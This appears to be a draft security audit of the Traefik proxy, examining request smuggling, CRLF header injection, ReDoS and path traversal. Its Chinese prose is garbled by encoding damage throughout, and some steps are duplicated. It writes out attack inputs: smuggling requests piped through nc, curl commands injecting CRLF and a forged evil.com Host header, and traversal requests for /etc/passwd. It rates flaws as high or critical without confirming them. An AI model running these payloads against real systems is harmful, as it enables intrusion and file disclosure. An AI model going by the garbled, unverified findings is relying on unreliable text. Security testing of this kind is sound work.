# Traefik è¯¦ç»†æ¼æ´åˆ†æ - é€æ­¥æ·±å…¥

## åˆ†æç›®æ ‡

é€ä¸ªè¯¦ç»†åˆ†æ Traefik çš„æ½œåœ¨å®‰å…¨æ¼æ´ï¼Œä»ä»£ç å±‚é¢æ·±å…¥ç†è§£æ¯ä¸ªæ”»å‡»é¢ã€‚

---

## åˆ†æ #1: HTTP Request Smugglingï¼ˆHTTP è¯·æ±‚èµ°ç§ï¼‰

### 1.1 ä»£ç ä½ç½®å’Œé€»è¾‘åˆ†æ

#### å…³é”®æ–‡ä»¶
- `pkg/server/server_entrypoint_tcp.go` - HTTP è¯·æ±‚å…¥å£
- `pkg/proxy/fast/proxy.go` - Fast HTTP ä»£ç†
- `pkg/proxy/httputil/proxy.go` - æ ‡å‡† HTTP ä»£ç†

#### ä»£ç åˆ†æ

**æ­¥éª¤ 1: HTTP è¯·æ±‚æ¥æ”¶**

Traefik ä½¿ç”¨ Go æ ‡å‡†åº“ `net/http` å¤„ç† HTTP è¯·æ±‚ã€‚è®©æˆ‘ä»¬æ£€æŸ¥è¯·æ±‚è§£æé€»è¾‘ï¼š

```go
// Go æ ‡å‡†åº“ net/http ä¼šè‡ªåŠ¨è§£æ HTTP è¯·æ±‚
// ä½†æˆ‘ä»¬éœ€è¦æ£€æŸ¥ Traefik å¦‚ä½•å¤„ç†ç‰¹æ®Šæƒ…å†µ
```

**æ­¥éª¤ 2: Content-Length å¤„ç†**

æ£€æŸ¥ `pkg/proxy/fast/connpool.go:224-308`ï¼š

```go
contentLength := res.Header.ContentLength()

if contentLength == 0 {
    return nil
}

// Chunked response, Content-Length is set to -1
if contentLength == -1 {
    cbr := httputil.NewChunkedReader(c.br)
    // ... å¤„ç† chunked encoding
}

// Response with a valid Content-Length header
brl.N = int64(res.Header.ContentLength())
```

**æ½œåœ¨é—®é¢˜ç‚¹ï¼š**

1. **è¯·æ±‚å¤„ç†**ï¼šTraefik ä½¿ç”¨ Go æ ‡å‡†åº“ï¼Œä½†éœ€è¦æ£€æŸ¥ï¼š
   - æ˜¯å¦åŒæ—¶å­˜åœ¨ Content-Length å’Œ Transfer-Encodingï¼Ÿ
   - å¦‚ä½•å¤„ç†å†²çªï¼Ÿ

2. **å“åº”å¤„ç†**ï¼šæ£€æŸ¥å“åº”å¤„ç†é€»è¾‘ï¼š
   - Content-Length = -1 è¡¨ç¤º chunked
   - Content-Length = -2 è¡¨ç¤ºæ—  Content-Length
   - ä½†è¯·æ±‚å¤„ç†å‘¢ï¼Ÿ

### 1.2 æ·±å…¥åˆ†æ

#### æ£€æŸ¥ç‚¹ 1: HTTP/1.1 è¯·æ±‚è§£æ

**é—®é¢˜ï¼š** Go æ ‡å‡†åº“ `net/http` å¦‚ä½•å¤„ç† CL.TE å†²çªï¼Ÿ

æ ¹æ® RFC 7230ï¼š
- å¦‚æœåŒæ—¶å­˜åœ¨ Content-Length å’Œ Transfer-Encodingï¼ŒTransfer-Encoding ä¼˜å…ˆ
- ä½†å®ç°å¯èƒ½ä¸åŒ

**æµ‹è¯•æ–¹æ³•ï¼š**
```bash
# æµ‹è¯• CL.TE
printf "POST / HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED" | nc localhost 8080
```

#### æ£€æŸ¥ç‚¹ 2: HTTP/2 å¤„ç†

HTTP/2 ä½¿ç”¨å¸§ï¼Œç†è®ºä¸Šä¸å®¹æ˜“å‡ºç° Request Smugglingï¼Œä½†éœ€è¦éªŒè¯ï¼š
- æ˜¯å¦å¯èƒ½é™çº§åˆ° HTTP/1.1ï¼Ÿ
- å¸§è¾¹ç•Œæ£€æµ‹æ˜¯å¦æ­£ç¡®ï¼Ÿ

#### æ£€æŸ¥ç‚¹ 3: ä»£ç†è½¬å‘é€»è¾‘

**å…³é”®ä»£ç ï¼š**
```go
// pkg/proxy/fast/proxy.go
// æ£€æŸ¥è¯·æ±‚å¦‚ä½•è½¬å‘åˆ°åç«¯
```

**æ½œåœ¨é—®é¢˜ï¼š**
- å¦‚æœ Traefik è¯¯è§£æäº†è¯·æ±‚è¾¹ç•Œï¼Œå¯èƒ½å°†å¤šä¸ªè¯·æ±‚ä½œä¸ºä¸€ä¸ªè¯·æ±‚è½¬å‘
- æˆ–è€…å°†ä¸€ä¸ªè¯·æ±‚è§£æä¸ºå¤šä¸ªè¯·æ±‚

### 1.3 æµ‹è¯•ç”¨ä¾‹

```http
# æµ‹è¯•ç”¨ä¾‹ 1: CL.TE
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# æµ‹è¯•ç”¨ä¾‹ 2: TE.CL
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked
Content-Length: 3

0

SMUGGLED

# æµ‹è¯•ç”¨ä¾‹ 3: TE.TE
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

SMUGGLED
```

### 1.4 é£é™©è¯„ä¼°

- **ä¸¥é‡æ€§ï¼š** ğŸ”´ CRITICALï¼ˆå¦‚æœå­˜åœ¨ï¼‰
- **å½±å“ï¼š** ç¼“å­˜æŠ•æ¯’ã€ä¼šè¯å›ºå®šã€ç»•è¿‡å®‰å…¨æ§åˆ¶
- **åˆ©ç”¨éš¾åº¦ï¼š** ğŸŸ¡ MEDIUM
- **éœ€è¦éªŒè¯ï¼š** å®é™…æµ‹è¯• Traefik çš„è¡Œä¸º

---

## åˆ†æ #2: HTTP Header Injectionï¼ˆHTTP å¤´éƒ¨æ³¨å…¥ï¼‰

### 2.1 ä»£ç ä½ç½®å’Œé€»è¾‘åˆ†æ

#### å…³é”®æ–‡ä»¶
- `pkg/middlewares/forwardedheaders/forwarded_header.go:183-184` âš ï¸ **é‡ç‚¹å…³æ³¨**

#### è¯¦ç»†ä»£ç åˆ†æ

**æ­¥éª¤ 1: X-Forwarded-For å¤„ç†**

```183:184:pkg/middlewares/forwardedheaders/forwarded_header.go
if xffs := unsafeHeader(outreq.Header).Values(xForwardedFor); len(xffs) > 0 {
	unsafeHeader(outreq.Header).Set(xForwardedFor, strings.Join(xffs, ", "))
}
```

**è¯¦ç»†åˆ†æï¼š**

1. **æ•°æ®æ¥æºï¼š** `xffs` æ¥è‡ª `outreq.Header.Values(xForwardedFor)`
   - è¿™æ˜¯**ç”¨æˆ·æä¾›çš„è¯·æ±‚å¤´**
   - å¯èƒ½åŒ…å«æ¶æ„å†…å®¹

2. **å¤„ç†æ–¹å¼ï¼š** `strings.Join(xffs, ", ")`
   - å°†å¤šä¸ª X-Forwarded-For å€¼ç”¨é€—å·è¿æ¥
   - **æ²¡æœ‰éªŒè¯æˆ–æ¸…ç†**
   - **æ²¡æœ‰æ£€æŸ¥ CRLF å­—ç¬¦**

3. **å†™å…¥ä½ç½®ï¼š** `unsafeHeader(outreq.Header).Set(xForwardedFor, ...)`
   - ç›´æ¥å†™å…¥åˆ°è½¬å‘è¯·æ±‚çš„å¤´éƒ¨
   - å¦‚æœåŒ…å« CRLFï¼ˆ`\r\n`ï¼‰ï¼Œå¯èƒ½å¯¼è‡´å¤´éƒ¨æ³¨å…¥

**å…³é”®ä»£ç ä¸Šä¸‹æ–‡ï¼š**

```192:209:pkg/middlewares/forwardedheaders/forwarded_header.go
// ServeHTTP implements http.Handler.
func (x *XForwarded) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if !x.insecure && !x.isTrustedIP(r.RemoteAddr) {
		for _, h := range xHeaders {
			unsafeHeader(r.Header).Del(h)
		}
	}

	x.rewrite(r)

	x.removeConnectionHeaders(r)

	if x.notAppendXForwardedFor {
		r = r.WithContext(httputil.SetNotAppendXFF(r.Context()))
	}

	x.next.ServeHTTP(w, r)
}
```

**é‡è¦å‘ç°ï¼š**
- å¦‚æœ `insecure=true` æˆ– IP æ˜¯ä¿¡ä»»çš„ï¼Œ**ä¸ä¼šåˆ é™¤ç°æœ‰å¤´éƒ¨**
- ç„¶åè°ƒç”¨ `rewrite()`ï¼Œå¯èƒ½ä½¿ç”¨ç”¨æˆ·æä¾›çš„å¤´éƒ¨å€¼
- **æ²¡æœ‰å¯¹å¤´éƒ¨å€¼è¿›è¡Œæ¸…ç†æˆ–éªŒè¯**

**æ­¥éª¤ 2: ä¿¡ä»»æ£€æŸ¥**

```go
// pkg/middlewares/forwardedheaders/forwarded_header.go:193-198
func (x *XForwarded) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    if !x.insecure && !x.isTrustedIP(r.RemoteAddr) {
        for _, h := range xHeaders {
            unsafeHeader(r.Header).Del(h)  // åˆ é™¤ç°æœ‰å¤´éƒ¨
        }
    }
    x.rewrite(r)  // ç„¶åé‡å†™
    // ...
}
```

**åˆ†æï¼š**
- å¦‚æœ `insecure=true` æˆ– IP æ˜¯ä¿¡ä»»çš„ï¼Œ**ä¸ä¼šåˆ é™¤ç°æœ‰å¤´éƒ¨**
- ç„¶åè°ƒç”¨ `rewrite()`ï¼Œå¯èƒ½ä½¿ç”¨ç”¨æˆ·æä¾›çš„å¤´éƒ¨å€¼

### 2.2 æ½œåœ¨æ¼æ´ç‚¹

#### æ¼æ´ç‚¹ 1: CRLF æ³¨å…¥åˆ° X-Forwarded-For

**åœºæ™¯ï¼š**
```http
GET / HTTP/1.1
Host: target
X-Forwarded-For: 127.0.0.1\r\nX-Injected: test\r\n
```

**å¦‚æœ Traefik è½¬å‘è¯·æ±‚æ—¶ï¼š**
```go
unsafeHeader(outreq.Header).Set(xForwardedFor, "127.0.0.1\r\nX-Injected: test\r\n")
```

**ç»“æœï¼š** å¯èƒ½æ³¨å…¥é¢å¤–çš„å“åº”å¤´

**éªŒè¯æ–¹æ³•ï¼š**
```bash
curl -v -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: test" http://localhost:8080/
```

#### æ¼æ´ç‚¹ 2: å¤šä¸ª X-Forwarded-For å€¼

**åœºæ™¯ï¼š**
```http
GET / HTTP/1.1
Host: target
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1\r\nX-Injected: test
```

**å¤„ç†ï¼š**
```go
xffs := []string{"127.0.0.1", "192.168.1.1\r\nX-Injected: test"}
result := strings.Join(xffs, ", ")
// ç»“æœ: "127.0.0.1, 192.168.1.1\r\nX-Injected: test"
```

**é—®é¢˜ï¼š** CRLF å­—ç¬¦è¢«ä¿ç•™åœ¨è¿æ¥åçš„å­—ç¬¦ä¸²ä¸­

#### æ¼æ´ç‚¹ 3: ç¼–ç ç»•è¿‡

**åœºæ™¯ï¼š**
```http
GET / HTTP/1.1
Host: target
X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: test
```

**æ£€æŸ¥ï¼š** Go çš„ `net/http` æ˜¯å¦è‡ªåŠ¨è§£ç  URL ç¼–ç çš„å¤´éƒ¨å€¼ï¼Ÿ

### 2.3 ä»£ç éªŒè¯

è®©æˆ‘æ£€æŸ¥ Go æ ‡å‡†åº“çš„è¡Œä¸ºï¼š

```go
// Go net/http åº“çš„è¡Œä¸ºï¼š
// 1. å¤´éƒ¨åç§°ä¼šè‡ªåŠ¨è§„èŒƒåŒ–ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰
// 2. å¤´éƒ¨å€¼é€šå¸¸ä¸ä¼šè‡ªåŠ¨è§£ç  URL ç¼–ç 
// 3. ä½†éœ€è¦å®é™…æµ‹è¯•
```

### 2.4 æµ‹è¯•æ­¥éª¤

**æµ‹è¯• 1: åŸºæœ¬ CRLF æ³¨å…¥**
```bash
curl -v -H "X-Forwarded-For: 127.0.0.1$(printf '\r\n')X-Injected: test" \
  http://localhost:8080/
```

**æµ‹è¯• 2: URL ç¼–ç ç»•è¿‡**
```bash
curl -v -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: test" \
  http://localhost:8080/
```

**æµ‹è¯• 3: å¤šä¸ªå¤´éƒ¨å€¼**
```bash
curl -v \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Forwarded-For: 192.168.1.1$(printf '\r\n')X-Injected: test" \
  http://localhost:8080/
```

### 2.5 é£é™©è¯„ä¼°

- **ä¸¥é‡æ€§ï¼š** ğŸ”´ HIGH
- **å½±å“ï¼š** å“åº”å¤´æ±¡æŸ“ã€å¯èƒ½çš„ XSSã€ç¼“å­˜æŠ•æ¯’
- **åˆ©ç”¨éš¾åº¦ï¼š** ğŸŸ¢ EASY
- **éœ€è¦éªŒè¯ï¼š** å®é™…æµ‹è¯•æ˜¯å¦å¯æ³¨å…¥

---

## åˆ†æ #3: Forward Auth æ¼æ´

### 3.1 ä»£ç ä½ç½®å’Œé€»è¾‘åˆ†æ

#### å…³é”®æ–‡ä»¶
- `pkg/middlewares/auth/forward.go:355-415` - å¤´éƒ¨å†™å…¥é€»è¾‘

#### è¯¦ç»†ä»£ç åˆ†æ

**æ­¥éª¤ 1: è®¤è¯è¯·æ±‚æ„é€ **

```355:415:pkg/middlewares/auth/forward.go
func writeHeader(req, forwardReq *http.Request, trustForwardHeader bool, allowedHeaders []string) {
	utils.CopyHeaders(forwardReq.Header, req.Header)

	RemoveConnectionHeaders(forwardReq)
	utils.RemoveHeaders(forwardReq.Header, hopHeaders...)

	forwardReq.Header = filterForwardRequestHeaders(forwardReq.Header, allowedHeaders)

	if clientIP, _, err := net.SplitHostPort(req.RemoteAddr); err == nil {
		if trustForwardHeader {
			if prior, ok := req.Header[forward.XForwardedFor]; ok {
				clientIP = strings.Join(prior, ", ") + ", " + clientIP
			}
		}
		forwardReq.Header.Set(forward.XForwardedFor, clientIP)
	}

	xMethod := req.Header.Get(xForwardedMethod)
	switch {
	case xMethod != "" && trustForwardHeader:
		forwardReq.Header.Set(xForwardedMethod, xMethod)
	case req.Method != "":
		forwardReq.Header.Set(xForwardedMethod, req.Method)
	default:
		forwardReq.Header.Del(xForwardedMethod)
	}

	xfp := req.Header.Get(forward.XForwardedProto)
	switch {
	case xfp != "" && trustForwardHeader:
		forwardReq.Header.Set(forward.XForwardedProto, xfp)
	case req.TLS != nil:
		forwardReq.Header.Set(forward.XForwardedProto, "https")
	default:
		forwardReq.Header.Set(forward.XForwardedProto, "http")
	}

	if xfp := req.Header.Get(forward.XForwardedPort); xfp != "" && trustForwardHeader {
		forwardReq.Header.Set(forward.XForwardedPort, xfp)
	}

	xfh := req.Header.Get(forward.XForwardedHost)
	switch {
	case xfh != "" && trustForwardHeader:
		forwardReq.Header.Set(forward.XForwardedHost, xfh)
	case req.Host != "":
		forwardReq.Header.Set(forward.XForwardedHost, req.Host)
	default:
		forwardReq.Header.Del(forward.XForwardedHost)
	}

	xfURI := req.Header.Get(xForwardedURI)
	switch {
	case xfURI != "" && trustForwardHeader:
		forwardReq.Header.Set(xForwardedURI, xfURI)
	case req.URL.RequestURI() != "":
		forwardReq.Header.Set(xForwardedURI, req.URL.RequestURI())
	default:
		forwardReq.Header.Del(xForwardedURI)
	}
}
```

**å…³é”®å‘ç°ï¼š**
- âš ï¸ **æ‰€æœ‰ç”¨æˆ·æä¾›çš„å¤´éƒ¨å€¼éƒ½ç›´æ¥ä½¿ç”¨**ï¼Œæ²¡æœ‰éªŒè¯
- âš ï¸ **ä»…åœ¨ `trustForwardHeader=true` æ—¶ä½¿ç”¨**ï¼Œä½†è¿™æ˜¯å¸¸è§é…ç½®
- âš ï¸ **æ²¡æœ‰æ¸…ç† CRLF æˆ–å…¶ä»–æ¶æ„å­—ç¬¦**

### 3.2 æ½œåœ¨æ¼æ´ç‚¹

#### æ¼æ´ç‚¹ 1: trustForwardHeader é…ç½®

**å…³é”®é€»è¾‘ï¼š**
```go
if trustForwardHeader {
    // ç›´æ¥ä½¿ç”¨ç”¨æˆ·æä¾›çš„å¤´éƒ¨å€¼
    forwardReq.Header.Set(xForwardedMethod, xMethod)
}
```

**é—®é¢˜ï¼š**
- å¦‚æœ `trustForwardHeader=true`ï¼Œ**å®Œå…¨ä¿¡ä»»ç”¨æˆ·æä¾›çš„å¤´éƒ¨**
- æ²¡æœ‰éªŒè¯å¤´éƒ¨å€¼
- å¯èƒ½åŒ…å« CRLF æˆ–å…¶ä»–æ¶æ„å†…å®¹

#### æ¼æ´ç‚¹ 2: å¤´éƒ¨å€¼æœªéªŒè¯

**æ‰€æœ‰ç”¨æˆ·æä¾›çš„å¤´éƒ¨å€¼éƒ½ç›´æ¥ä½¿ç”¨ï¼š**
- `X-Forwarded-Method`
- `X-Forwarded-Proto`
- `X-Forwarded-Host`
- `X-Forwarded-Uri`

**æ½œåœ¨é—®é¢˜ï¼š**
1. CRLF æ³¨å…¥
2. åè®®æ··æ·†ï¼ˆå¦‚ `X-Forwarded-Proto: https\r\nX-Injected: test`ï¼‰
3. ä¸»æœºæ³¨å…¥ï¼ˆå¦‚ `X-Forwarded-Host: evil.com\r\nHost: evil.com`ï¼‰

#### æ¼æ´ç‚¹ 3: è®¤è¯å“åº”è§£æ

**æ£€æŸ¥è®¤è¯å“åº”çš„å¤„ç†ï¼š**
```go
// pkg/middlewares/auth/forward.go:196-220
forwardResponse, forwardErr := fa.client.Do(forwardReq)
// ... è§£æå“åº”
```

**æ½œåœ¨é—®é¢˜ï¼š**
- å¦‚æœè®¤è¯æœåŠ¡è¿”å›æ¶æ„å“åº”å¤´ï¼Œæ˜¯å¦ä¼šè¢«æ­£ç¡®å¤„ç†ï¼Ÿ
- å“åº”å¤´æ˜¯å¦ä¼šè¢«è½¬å‘åˆ°å®¢æˆ·ç«¯ï¼Ÿ

### 3.3 æµ‹è¯•æ­¥éª¤

**æµ‹è¯• 1: trustForwardHeader=true æ—¶çš„å¤´éƒ¨æ³¨å…¥**
```bash
# é…ç½® trustForwardHeader=true
curl -v \
  -H "X-Forwarded-Method: GET$(printf '\r\n')X-Injected: test" \
  http://localhost:8080/
```

**æµ‹è¯• 2: åè®®æ··æ·†**
```bash
curl -v \
  -H "X-Forwarded-Proto: https$(printf '\r\n')X-Injected: test" \
  http://localhost:8080/
```

**æµ‹è¯• 3: ä¸»æœºæ³¨å…¥**
```bash
curl -v \
  -H "X-Forwarded-Host: evil.com$(printf '\r\n')Host: evil.com" \
  http://localhost:8080/
```

### 3.4 é£é™©è¯„ä¼°

- **ä¸¥é‡æ€§ï¼š** ğŸ”´ HIGH
- **å½±å“ï¼š** è®¤è¯ç»•è¿‡ã€å¤´éƒ¨æ³¨å…¥ã€åè®®æ··æ·†
- **åˆ©ç”¨éš¾åº¦ï¼š** ğŸŸ¡ MEDIUMï¼ˆéœ€è¦ trustForwardHeader=trueï¼‰
- **éœ€è¦éªŒè¯ï¼š** å®é™…æµ‹è¯•é…ç½®å’Œè¡Œä¸º

---

## åˆ†æ #4: æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ï¼ˆReDoSï¼‰

### 4.1 ä»£ç ä½ç½®å’Œé€»è¾‘åˆ†æ

#### å…³é”®æ–‡ä»¶
- `pkg/middlewares/headers/header.go:31-38` - CORS æ­£åˆ™ç¼–è¯‘

#### è¯¦ç»†ä»£ç åˆ†æ

**æ­¥éª¤ 1: CORS æ­£åˆ™è¡¨è¾¾å¼ç¼–è¯‘**

```31:38:pkg/middlewares/headers/header.go
regexes := make([]*regexp.Regexp, len(cfg.AccessControlAllowOriginListRegex))
for i, str := range cfg.AccessControlAllowOriginListRegex {
	reg, err := regexp.Compile(str)
	if err != nil {
		return nil, fmt.Errorf("error occurred during origin parsing: %w", err)
	}
	regexes[i] = reg
}
```

**åˆ†æï¼š**
- `str` æ¥è‡ªé…ç½® `cfg.AccessControlAllowOriginListRegex`
- å¦‚æœé…ç½®è¢«æ¶æ„ä¿®æ”¹ï¼Œå¯èƒ½åŒ…å«æ¶æ„æ­£åˆ™è¡¨è¾¾å¼
- æ­£åˆ™è¡¨è¾¾å¼åœ¨**é…ç½®åŠ è½½æ—¶ç¼–è¯‘**ï¼Œä¸æ˜¯åœ¨è¯·æ±‚æ—¶
- **ç¼–è¯‘æ—¶å¯èƒ½ CPU è€—å°½**ï¼ˆå¦‚æœæ­£åˆ™è¡¨è¾¾å¼å¤æ‚ï¼‰

**æ­¥éª¤ 2: æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨**

```178:192:pkg/middlewares/headers/header.go
func (s *Header) isOriginAllowed(origin string) (bool, string) {
	for _, item := range s.headers.AccessControlAllowOriginList {
		if item == "*" || item == origin {
			return true, item
		}
	}

	for _, regex := range s.allowOriginRegexes {
		if regex.MatchString(origin) {
			return true, origin
		}
	}

	return false, ""
}
```

**åˆ†æï¼š**
- æ­£åˆ™è¡¨è¾¾å¼åœ¨**æ¯ä¸ªè¯·æ±‚æ—¶æ‰§è¡Œ** `regex.MatchString(origin)`
- å¦‚æœ `origin` æ˜¯æ¶æ„æ„é€ çš„ï¼Œå¯èƒ½å¯¼è‡´ ReDoS
- **è¯·æ±‚æ—¶ CPU è€—å°½**

**æ­¥éª¤ 2: æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨**

éœ€è¦æ‰¾åˆ°è¿™äº›æ­£åˆ™è¡¨è¾¾å¼åœ¨å“ªé‡Œä½¿ç”¨ï¼š

```go
// æœç´¢ allowOriginRegexes çš„ä½¿ç”¨
grep -r "allowOriginRegexes" pkg/middlewares/headers/
```

### 4.2 æ½œåœ¨æ¼æ´ç‚¹

#### æ¼æ´ç‚¹ 1: é…ç½®ä¸­çš„æ¶æ„æ­£åˆ™

**åœºæ™¯ï¼š**
```yaml
# æ¶æ„é…ç½®
http:
  middlewares:
    cors:
      headers:
        accessControlAllowOriginListRegex:
          - "(a+)+$"  # æ¶æ„æ­£åˆ™è¡¨è¾¾å¼
```

**å½±å“ï¼š**
- é…ç½®åŠ è½½æ—¶ç¼–è¯‘ï¼Œå¯èƒ½å¯¼è‡´å¯åŠ¨æ—¶ CPU è€—å°½
- å¦‚æœè¿è¡Œæ—¶ä½¿ç”¨ï¼Œå¯èƒ½å¯¼è‡´è¯·æ±‚å¤„ç†æ—¶ CPU è€—å°½

#### æ¼æ´ç‚¹ 2: è§„åˆ™ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼

**æ£€æŸ¥è·¯ç”±è§„åˆ™ä¸­çš„æ­£åˆ™ï¼š**
```go
// pkg/rules/parser.go
// è§„åˆ™å¯èƒ½åŒ…å«æ­£åˆ™è¡¨è¾¾å¼
```

**æ½œåœ¨é—®é¢˜ï¼š**
- å¦‚æœè§„åˆ™æ¥è‡ªç”¨æˆ·è¾“å…¥ï¼ˆå¦‚æ³¨è§£ï¼‰ï¼Œå¯èƒ½åŒ…å«æ¶æ„æ­£åˆ™
- è§„åˆ™åœ¨è¯·æ±‚æ—¶è§£æï¼Œå¯èƒ½å¯¼è‡´ ReDoS

### 4.3 æµ‹è¯•æ­¥éª¤

**æµ‹è¯• 1: æ¶æ„ CORS æ­£åˆ™**
```yaml
# é…ç½®æ–‡ä»¶
http:
  middlewares:
    test-cors:
      headers:
        accessControlAllowOriginListRegex:
          - "(a+)+$"
```

**æµ‹è¯• 2: æ¶æ„è§„åˆ™æ­£åˆ™**
```yaml
# è·¯ç”±è§„åˆ™
http:
  routers:
    test:
      rule: "HostRegexp(`(a+)+$`)"
      service: test-service
```

**ç„¶åå‘é€å¤§é‡ 'a' å­—ç¬¦çš„è¯·æ±‚ï¼š**
```bash
for i in {20..30}; do
    host=$(python3 -c "print('a' * $i)")
    time curl -H "Host: ${host}" http://localhost:8080/
done
```

### 4.4 é£é™©è¯„ä¼°

- **ä¸¥é‡æ€§ï¼š** ğŸŸ¡ MEDIUM-HIGH
- **å½±å“ï¼š** CPU è€—å°½ã€æ‹’ç»æœåŠ¡
- **åˆ©ç”¨éš¾åº¦ï¼š** ğŸŸ¢ EASYï¼ˆå¦‚æœé…ç½®å¯æ§ï¼‰
- **éœ€è¦éªŒè¯ï¼š** æµ‹è¯•æ¶æ„æ­£åˆ™çš„å½±å“

---

## åˆ†æ #5: è·¯å¾„å¤„ç†é€»è¾‘æ¼æ´

### 5.1 ä»£ç ä½ç½®å’Œé€»è¾‘åˆ†æ

#### å…³é”®æ–‡ä»¶
- `pkg/muxer/http/mux.go:130-168` - è·¯å¾„å¤„ç†å’Œç¼–ç è§£æ âš ï¸ **å…³é”®ä»£ç **

#### è¯¦ç»†ä»£ç åˆ†æ

**æ­¥éª¤ 1: è·¯å¾„ç¼–ç å¤„ç†**

```130:168:pkg/muxer/http/mux.go
func withRoutingPath(req *http.Request) (*http.Request, error) {
	escapedPath := req.URL.EscapedPath()

	var routingPathBuilder strings.Builder
	for i := 0; i < len(escapedPath); i++ {
		if escapedPath[i] != '%' {
			routingPathBuilder.WriteString(string(escapedPath[i]))
			continue
		}

		// This should never happen as the standard library will reject requests containing invalid percent-encodings.
		// This discards URLs with a percent character at the end.
		if i+2 >= len(escapedPath) {
			return nil, errors.New("invalid percent-encoding at the end of the URL path")
		}

		encodedCharacter := escapedPath[i : i+3]
		if _, reserved := reservedCharacters[encodedCharacter]; reserved {
			routingPathBuilder.WriteString(encodedCharacter)
		} else {
			// This should never happen as the standard library will reject requests containing invalid percent-encodings.
			decodedCharacter, err := url.PathUnescape(encodedCharacter)
			if err != nil {
				return nil, errors.New("invalid percent-encoding in URL path")
			}
			routingPathBuilder.WriteString(decodedCharacter)
		}

		i += 2
	}

	return req.WithContext(
		context.WithValue(
			req.Context(),
			mux.RoutingPathKey,
			routingPathBuilder.String(),
		),
	), nil
}
```

**åˆ†æï¼š**
1. âœ… **è¾¹ç•Œæ£€æŸ¥**ï¼šæ£€æŸ¥ `i+2 >= len(escapedPath)`ï¼Œé˜²æ­¢è¶Šç•Œ
2. âœ… **ä¿ç•™å­—ç¬¦å¤„ç†**ï¼šæ£€æŸ¥ `reservedCharacters`ï¼Œä¿ç•™ç‰¹æ®Šå­—ç¬¦
3. âš ï¸ **è·¯å¾„è§„èŒƒåŒ–**ï¼šä½¿ç”¨ `url.PathUnescape()` è§£ç ï¼Œä½†**æ²¡æœ‰åç»­çš„è·¯å¾„æ¸…ç†**
4. âš ï¸ **æ½œåœ¨é—®é¢˜**ï¼šè§£ç åçš„è·¯å¾„å¯èƒ½åŒ…å« `..` æˆ– `.`ï¼Œä½†æ²¡æœ‰è°ƒç”¨ `path.Clean()`

**æ­¥éª¤ 2: è·¯å¾„è§„èŒƒåŒ–ç¼ºå¤±**

**å…³é”®å‘ç°ï¼š**
- ä»£ç æ³¨é‡Šè¯´ï¼š"This should never happen as the standard library will reject..."
- ä½†**ä¾èµ–æ ‡å‡†åº“çš„è¡Œä¸º**å¯èƒ½ä¸å¤Ÿ
- è§£ç åçš„è·¯å¾„ç›´æ¥ä½¿ç”¨ï¼Œ**æ²¡æœ‰è§„èŒƒåŒ–**

**æ½œåœ¨ç»•è¿‡ï¼š**
```go
// å¦‚æœæ ‡å‡†åº“å…è®¸ï¼Œè¿™äº›å¯èƒ½ç»•è¿‡ï¼š
"/api/../admin"           // å¯èƒ½è¢«è§£æä¸º "/admin"
"/api/%2e%2e/admin"       // ç¼–ç åçš„ ..
"/api/%2e%2e%2fadmin"     // ç¼–ç åçš„ ../
```

### 5.2 æ½œåœ¨æ¼æ´ç‚¹

#### æ¼æ´ç‚¹ 1: path.Join çš„è¡Œä¸º

**æµ‹è¯•ï¼š**
```go
path.Join("/api", "../admin")  // ç»“æœ: "/admin"
path.Join("/api", "../../etc/passwd")  // ç»“æœ: "/etc/passwd"
```

**é—®é¢˜ï¼š** å¦‚æœ `u.path` æ˜¯ç›¸å¯¹è·¯å¾„æˆ–åŒ…å« `..`ï¼Œå¯èƒ½ç»•è¿‡é™åˆ¶

#### æ¼æ´ç‚¹ 2: TrimPrefix çš„é—®é¢˜

```go
strings.TrimPrefix("/api/v1", "/api")  // ç»“æœ: "/v1"
strings.TrimPrefix("/api/v1/../admin", "/api")  // ç»“æœ: "/v1/../admin"
```

**é—®é¢˜ï¼š** `TrimPrefix` ä¸ä¼šå¤„ç†è·¯å¾„è§„èŒƒåŒ–ï¼Œå¯èƒ½ä¿ç•™ `..`

#### æ¼æ´ç‚¹ 3: ç¼–ç ç»•è¿‡

**æµ‹è¯•å„ç§ç¼–ç ï¼š**
- `%2e%2e%2f` â†’ `../`
- `%2e%2e/` â†’ `../`
- `..%2f` â†’ `../`
- Unicode ç¼–ç ï¼Ÿ

### 5.3 æµ‹è¯•æ­¥éª¤

**æµ‹è¯• 1: åŸºæœ¬è·¯å¾„éå†**
```bash
curl http://localhost:8080/../../etc/passwd
```

**æµ‹è¯• 2: ç¼–ç ç»•è¿‡**
```bash
curl http://localhost:8080/%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**æµ‹è¯• 3: æ··åˆç¼–ç **
```bash
curl http://localhost:8080/%2e%2e/%2e%2e/etc/passwd
```

### 5.4 é£é™©è¯„ä¼°

- **ä¸¥é‡æ€§ï¼š** ğŸŸ¡ MEDIUM
- **å½±å“ï¼š** è·¯å¾„éå†ã€è·¯ç”±ç»•è¿‡
- **åˆ©ç”¨éš¾åº¦ï¼š** ğŸŸ¡ MEDIUM
- **éœ€è¦éªŒè¯ï¼š** å®é™…æµ‹è¯•è·¯å¾„å¤„ç†

---

## åˆ†æ #6: å…¶ä»–æ½œåœ¨é—®é¢˜

### 6.1 WebSocket åè®®æ··æ·†

**å…³é”®ä»£ç ï¼š**
```go
// pkg/proxy/fast/proxy.go:165-178
reqUpType := upgradeType(req.Header)
if !isGraphic(reqUpType) {
    proxyhttputil.ErrorHandler(rw, req, fmt.Errorf("client tried to switch to invalid protocol %q", reqUpType))
    return
}
```

**æ£€æŸ¥ç‚¹ï¼š**
- `isGraphic` å‡½æ•°æ˜¯å¦æ­£ç¡®ï¼Ÿ
